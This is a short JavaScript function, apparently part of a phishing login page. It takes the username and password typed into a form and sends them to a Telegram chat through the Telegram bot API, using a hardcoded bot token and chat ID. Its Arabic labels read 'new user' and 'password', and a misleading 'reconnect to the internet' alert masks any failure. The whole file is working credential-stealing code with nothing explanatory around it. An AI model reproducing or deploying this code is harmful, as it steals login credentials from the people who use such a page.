function sendMessage() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const botToken = '7509225299:AAF9UyvAlML4oh6u7WvCNoX0_Imo0tBkQkU';
    const chatId = '5687419212';
    const message = `مستخدم جديد:\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (!data.ok) {
                alert('يجب إعادة الاتصال بالإنترنت');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('يجب إعادة الاتصال بالإنترنت');
        });
}
